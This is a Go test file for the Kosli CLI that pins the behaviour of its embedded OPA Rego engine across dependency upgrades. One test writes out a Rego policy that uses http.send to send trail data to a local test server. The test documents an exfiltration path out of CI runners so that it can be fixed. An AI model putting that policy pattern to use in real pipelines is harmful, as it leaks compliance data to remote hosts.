package evaluate

import (
	_ "embed"
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"testing"

	"github.com/open-policy-agent/opa/v1/ast"
	"github.com/open-policy-agent/opa/v1/version"
	"github.com/stretchr/testify/require"
)

// These tests pin the contract between the Kosli CLI and the embedded OPA
// runtime. Unlike rego_test.go — which covers our own Evaluate() logic — every
// test here exists to make an OPA upgrade fail loudly in CI rather than in a
// customer's pipeline. Policies passed to `kosli evaluate` are written by
// users, so any change to Rego parsing, safety checking, or the built-in
// surface is a breaking change for us even when our own Go code compiles.
//
// Added after the review of the OPA 1.18.2 -> 1.19.0 bump (PR #1071), where
// stricter safety checking for `:=` silently invalidated a class of previously
// working customer policies.
//
// When one of these fails after a dependency bump, that is the signal to write
// release notes, not to weaken the assertion.

// realisticTrailInput mirrors the shape produced by TransformTrail +
// RehydrateTrail: attestations keyed by name, each carrying the fields the
// Kosli API returns.
func realisticTrailInput() map[string]interface{} {
	return map[string]interface{}{
		"trail": map[string]interface{}{
			"name": "release-42",
			"compliance_status": map[string]interface{}{
				"attestations_statuses": map[string]interface{}{
					"pull-request": map[string]interface{}{
						"attestation_name": "pull-request",
						"compliant":        true,
						"html_url":         "https://app.kosli.com/kosli/flows/cli/trails/release-42",
						"created_at":       "2026-01-14T09:30:00Z",
					},
					"unit-tests": map[string]interface{}{
						"attestation_name": "unit-tests",
						"compliant":        true,
						"html_url":         "https://app.kosli.com/kosli/flows/cli/trails/release-42",
						"created_at":       "2026-01-14T09:35:00Z",
					},
					"snyk-scan": map[string]interface{}{
						"attestation_name": "snyk-scan",
						"compliant":        false,
						"html_url":         "https://app.kosli.com/kosli/flows/cli/trails/release-42",
						"created_at":       "2026-01-14T09:40:00Z",
					},
				},
			},
		},
		"version": "v2.36.3",
	}
}

// realisticPolicy is deliberately written the way a customer would write one:
// a default-deny allow rule, required-attestation checks driven by data.params,
// iteration with `some ... in`, and violation messages built with sprintf.
//
// It uses the default-plus-override idiom for params rather than
// object.get(data.params, ...) — see
// TestOPAContract_ObjectGetOnParamsIsUndefinedWithoutParamsFlag for why.
//
// This is the single source for that policy: cmd/kosli's CLI tests point
// --policy at the same file rather than keeping a second copy, so a fix to one
// layer cannot silently miss the other. Embedding (rather than reading at run
// time) means a rename or deletion breaks the build instead of one test.
//
//go:embed testdata/policies/realistic-compliance.rego
var realisticPolicy string

func TestOPAContract_RealisticPolicyAllows(t *testing.T) {
	result, err := Evaluate(realisticPolicy, realisticTrailInput(), nil)
	require.NoError(t, err)
	require.True(t, result.Allow, "pull-request and unit-tests are both compliant")
	require.Empty(t, result.Violations)
}

func TestOPAContract_RealisticPolicyDeniesOnDefaultRequirements(t *testing.T) {
	input := realisticTrailInput()
	attestations := input["trail"].(map[string]interface{})["compliance_status"].(map[string]interface{})["attestations_statuses"].(map[string]interface{})
	attestations["unit-tests"].(map[string]interface{})["compliant"] = false

	result, err := Evaluate(realisticPolicy, input, nil)
	require.NoError(t, err)
	require.False(t, result.Allow, "a required attestation is not compliant")
	require.Equal(t, []string{`attestation "unit-tests" is not compliant`}, result.Violations)
}

func TestOPAContract_RealisticPolicyDeniesWithViolations(t *testing.T) {
	params := map[string]interface{}{
		"required_attestations": []interface{}{"pull-request", "snyk-scan", "sbom"},
	}

	result, err := Evaluate(realisticPolicy, realisticTrailInput(), params)
	require.NoError(t, err)
	require.False(t, result.Allow)
	require.Len(t, result.Violations, 2)
	require.Contains(t, result.Violations, `attestation "snyk-scan" is not compliant`)
	require.Contains(t, result.Violations, `required attestation "sbom" is missing`)
}

// TestOPAContract_BuiltinsUsedByRealPoliciesAreAvailable pins the built-in
// surface customers reach for in compliance policies. OPA can deprecate or
// change built-in signatures across minor releases; this catches that at
// upgrade time.
func TestOPAContract_BuiltinsUsedByRealPoliciesAreAvailable(t *testing.T) {
	for _, tc := range []struct {
		name string
		body string
	}{
		{"regex.match", `regex.match("^v[0-9]+\\.[0-9]+\\.[0-9]+$", input.version)`},
		{"semver.compare", `semver.compare(trim_prefix(input.version, "v"), "2.0.0") >= 0`},
		{"time.parse_rfc3339_ns", `time.parse_rfc3339_ns(input.trail.compliance_status.attestations_statuses["unit-tests"].created_at) > 0`},
		{"startswith", `startswith(input.trail.compliance_status.attestations_statuses["unit-tests"].html_url, "https://")`},
		{"count and object.keys", `count(object.keys(input.trail.compliance_status.attestations_statuses)) == 3`},
		{"every", `every name, att in input.trail.compliance_status.attestations_statuses { att.attestation_name == name }`},
		{"some ... in", `some att in input.trail.compliance_status.attestations_statuses; att.compliant == true`},
		{"json.marshal round-trip", `json.unmarshal(json.marshal(input)).version == "v2.36.3"`},
		{"sprintf", `sprintf("%s/%d", ["trail", 42]) == "trail/42"`},
		{"walk", `walk(input, [["version"], v]); v == "v2.36.3"`},
	} {
		t.Run(tc.name, func(t *testing.T) {
			policy := fmt.Sprintf("package policy\n\ndefault allow := false\n\nallow if {\n\t%s\n}\n", tc.body)

			result, err := Evaluate(policy, realisticTrailInput(), nil)
			require.NoError(t, err, "built-in should still compile and evaluate")
			require.True(t, result.Allow, "built-in expression should hold for the fixture input")
		})
	}
}

// TestOPAContract_RegoV1SyntaxIsTheDefault pins that policies are parsed as
// Rego v1: a v0-style rule body without the `if` keyword must be rejected.
// If OPA ever changes the default parser version, users' policies change
// meaning underneath them and this test goes red first.
func TestOPAContract_RegoV1SyntaxIsTheDefault(t *testing.T) {
	policy := `package policy

allow {
	input.score > 3
}
`

	_, err := Evaluate(policy, map[string]interface{}{"score": 5}, nil)
	require.Error(t, err)
	require.Contains(t, err.Error(), "failed to parse policy")
	require.Contains(t, err.Error(), "`if` keyword is required before rule body")
}

// TestOPAContract_ExplicitRegoV1ImportStillCompiles guards the other
// direction: `import rego.v1` is redundant under v1 but appears in policies
// written during the v0->v1 transition (and in this repo's own fixtures), so
// it must keep working.
func TestOPAContract_ExplicitRegoV1ImportStillCompiles(t *testing.T) {
	policy := `package policy

import rego.v1

default allow := false

allow if {
	input.score > 3
}
`

	result, err := Evaluate(policy, map[string]interface{}{"score": 5}, nil)
	require.NoError(t, err)
	require.True(t, result.Allow)
}

// TestOPAContract_UnsafeVarIsReportedWithFileAndLine pins how an
// uncompilable policy reaches the user. Note that the message says
// "policy evaluation failed" even though this is a compile error: validatePolicy
// only parses, so safety checking happens inside rego.Eval. The file:line from
// OPA is what makes the error actionable, so assert on it.
func TestOPAContract_UnsafeVarIsReportedWithFileAndLine(t *testing.T) {
	policy := `package policy

default allow := false

allow if {
	x := y
	x == 7
}
`

	_, err := Evaluate(policy, map[string]interface{}{}, nil)
	require.Error(t, err)
	require.Contains(t, err.Error(), "rego_unsafe_var_error")
	require.Contains(t, err.Error(), "policy.rego:6")
}

// TestOPAContract_AssignmentRHSSafetyIsStrict documents the OPA 1.19.0
// behaviour change flagged in the PR #1071 review: the right-hand side of `:=`
// is now a read that must be made safe by another expression. Before 1.19.0
// this policy compiled (and `allow` was simply undefined); from 1.19.0 it is
// rejected at compile time.
//
// This is the concrete shape of the regression a customer would hit — if a
// later OPA relaxes it again, that is also worth knowing about.
func TestOPAContract_AssignmentRHSSafetyIsStrict(t *testing.T) {
	policy := `package policy

default allow := false

allow if {
	x := y
	x = 7
}
`

	_, err := Evaluate(policy, map[string]interface{}{}, nil)
	require.Error(t, err)
	require.Contains(t, err.Error(), "rego_unsafe_var_error")
	require.Contains(t, err.Error(), "var y is unsafe")
}

// TestOPAContract_SafeAssignmentFromInputStillCompiles is the over-strictness
// guard that pairs with the test above: the common, correct use of `:=` must
// keep working. If a future OPA release tightens safety further and breaks
// this, the bump must not ship silently.
func TestOPAContract_SafeAssignmentFromInputStillCompiles(t *testing.T) {
	policy := `package policy

default allow := false

allow if {
	score := input.score
	threshold := count(input.checks)
	score >= threshold
}
`

	input := map[string]interface{}{"score": 5, "checks": []interface{}{"a", "b", "c"}}

	result, err := Evaluate(policy, input, nil)
	require.NoError(t, err)
	require.True(t, result.Allow)
}

// TestOPAContract_CompileErrorInViolationsRuleFailsBeforeVerdict pins that a
// broken `violations` rule is reported up front rather than after the user has
// already been shown a DENIED verdict. Rego compiles the whole module, so the
// first Eval fails — we must never print a verdict we cannot explain.
func TestOPAContract_CompileErrorInViolationsRuleFailsBeforeVerdict(t *testing.T) {
	policy := `package policy

default allow := false

violations contains msg if {
	msg := undefined_helper
}
`

	result, err := Evaluate(policy, map[string]interface{}{}, nil)
	require.Error(t, err)
	require.Nil(t, result)
	require.Contains(t, err.Error(), "rego_unsafe_var_error")
}

// TestOPAContract_UndefinedAllowIsAnError characterises a sharp edge worth
// keeping visible: when `allow` ends up undefined the user gets an *error*,
// not a DENIED verdict — though most people read "no allow" as "deny". Both
// routes to undefined are covered: a missing `default`, and an expression that
// goes undefined at evaluation time. If we ever decide undefined should mean
// deny, this is the test to change.
func TestOPAContract_UndefinedAllowIsAnError(t *testing.T) {
	for _, tc := range []struct {
		name   string
		policy string
		input  map[string]interface{}
	}{
		{
			name: "no default and the body does not hold",
			policy: `package policy

allow if {
	input.score > 3
}
`,
			input: map[string]interface{}{"score": 1},
		},
		{
			name: "expression is undefined at evaluation time",
			policy: `package policy

allow if {
	ratio := input.passed / input.total
	ratio > 0.5
}
`,
			input: map[string]interface{}{"passed": 3, "total": 0},
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			_, err := Evaluate(tc.policy, tc.input, nil)
			require.Error(t, err)
			require.Contains(t, err.Error(), "policy did not return a result")
		})
	}
}

// TestOPAContract_OnlyStringViolationsSurvive characterises collectViolations:
// non-string entries in the `violations` set are silently discarded. A policy
// that yields only objects therefore reports DENIED with no reasons at all.
// Pinned so the behaviour is a decision rather than an accident.
func TestOPAContract_OnlyStringViolationsSurvive(t *testing.T) {
	for _, tc := range []struct {
		name   string
		rules  string
		expect []string
	}{
		{
			name: "objects are dropped, leaving no reasons",
			rules: `violations contains msg if {
	msg := {"rule": "snyk", "detail": "not compliant"}
}`,
			expect: nil,
		},
		{
			name: "strings survive alongside dropped non-strings",
			rules: `violations contains "snyk-scan is not compliant"

violations contains msg if {
	msg := 42
}`,
			expect: []string{"snyk-scan is not compliant"},
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			policy := "package policy\n\ndefault allow := false\n\n" + tc.rules + "\n"

			result, err := Evaluate(policy, map[string]interface{}{}, nil)
			require.NoError(t, err)
			require.False(t, result.Allow)
			require.Equal(t, tc.expect, result.Violations)
		})
	}
}

// TestOPAContract_PolicyCanReachTheNetwork characterises a security-relevant
// property: we construct rego.New without a capabilities restriction, so a
// user policy can call http.send. Combined with `--policy https://...`, a
// third party controls both the policy and a channel out of the CI runner —
// the policy input (trail and attestation data) can be exfiltrated, and the
// CLI's exit code can be made to depend on a remote host.
//
// This test asserts today's behaviour, not a desired one. The fix would be to
// build rego.New with an ast.Capabilities allowlist that drops http.send,
// net.*, and opa.runtime; when we do, invert this assertion.
func TestOPAContract_PolicyCanReachTheNetwork(t *testing.T) {
	var reachedServer bool
	var receivedBody string
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		reachedServer = true
		receivedBody = r.URL.RawQuery
		w.WriteHeader(http.StatusOK)
		_, _ = fmt.Fprint(w, `{"ok": true}`)
	}))
	defer server.Close()

	policy := fmt.Sprintf(`package policy

default allow := false

allow if {
	response := http.send({
		"method": "GET",
		"url": sprintf("%s?trail=%%s", [input.trail.name]),
		"raise_error": false,
	})
	response.status_code == 200
}
`, server.URL)

	result, err := Evaluate(policy, realisticTrailInput(), nil)
	require.NoError(t, err)
	require.True(t, result.Allow)
	require.True(t, reachedServer, "http.send is currently available to user policies")
	require.Contains(t, receivedBody, "release-42", "policy input can be sent to a remote host")
}

// TestOPAContract_ParamsAreIsolatedFromPolicyData pins that --params lands at
// data.params and nowhere else, so a policy cannot be surprised by CLI-injected
// data at other paths.
func TestOPAContract_ParamsAreIsolatedFromPolicyData(t *testing.T) {
	policy := `package policy

default allow := false

allow if {
	object.get(data.params, "threshold", 0) == 7
	not data.threshold
}
`

	result, err := Evaluate(policy, map[string]interface{}{}, map[string]interface{}{"threshold": 7})
	require.NoError(t, err)
	require.True(t, result.Allow)
}

// TestOPAContract_ObjectGetOnParamsIsUndefinedWithoutParamsFlag characterises
// a trap in how Evaluate wires params: the inmem store is installed only when
// params is non-nil, so with no --params the whole `data.params` document is
// undefined rather than empty. That breaks the most natural way to give a
// param a default — object.get(data.params, "k", fallback) is undefined, not
// the fallback — and, because an undefined rule body just makes `violations`
// empty, a policy written that way silently degrades to allow rather than
// erroring.
//
// The documented workaround is the default-plus-override idiom used by
// realisticPolicy. The fix, if we take it, is to always install the store with
// an empty params object; then this test's expectations invert.
func TestOPAContract_ObjectGetOnParamsIsUndefinedWithoutParamsFlag(t *testing.T) {
	policy := `package policy

default allow := false

allow if {
	input.score >= object.get(data.params, "threshold", 3)
}
`

	input := map[string]interface{}{"score": 5}

	withParams, err := Evaluate(policy, input, map[string]interface{}{"unrelated": true})
	require.NoError(t, err)
	require.True(t, withParams.Allow, "with a store installed, object.get returns the fallback of 3")

	withoutParams, err := Evaluate(policy, input, nil)
	require.NoError(t, err)
	require.False(t, withoutParams.Allow,
		"without --params, data.params is undefined so object.get yields undefined, not the fallback")
}

// TestPolicyFixturesStillCompile is the canary for this package's shared
// fixtures — the mirror of the one in cmd/kosli, each covering its own
// testdata. Both check that the fixture corpus survives an OPA bump.
//
// Note what this proves and what it does not: it parses and compiles each
// module standalone, whereas production Evaluate never compiles standalone —
// it hands the module to rego.Eval, which compiles it with input and store
// bound. The parser options and capabilities match today, so a fixture that
// compiles here compiles there, but "still compiles" is not "still evaluates
// to the same verdict". The behavioural assertions above cover that.
func TestPolicyFixturesStillCompile(t *testing.T) {
	// Mirrors the skip-set in cmd/kosli's copy of this canary. Empty today —
	// this package's testdata holds only valid fixtures — but kept so that an
	// intentionally uncompilable fixture added here (an unsafe-var
	// characterisation, say) has an obvious home instead of turning the canary
	// red spuriously. The two mirrors are meant to behave identically.
	deliberatelyBroken := map[string]bool{}

	paths, err := filepath.Glob("testdata/policies/*.rego")
	require.NoError(t, err)
	require.NotEmpty(t, paths, "expected policy fixtures to exist")

	for _, path := range paths {
		name := filepath.Base(path)
		if deliberatelyBroken[name] {
			continue
		}
		t.Run(name, func(t *testing.T) {
			source, err := os.ReadFile(path)
			require.NoError(t, err)

			module, err := ast.ParseModuleWithOpts(name, string(source), ast.ParserOptions{})
			require.NoError(t, err, "fixture no longer parses under OPA %s", version.Version)

			compiler := ast.NewCompiler()
			compiler.Compile(map[string]*ast.Module{name: module})
			require.False(t, compiler.Failed(),
				"fixture no longer compiles under OPA %s: %v", version.Version, compiler.Errors)
		})
	}
}
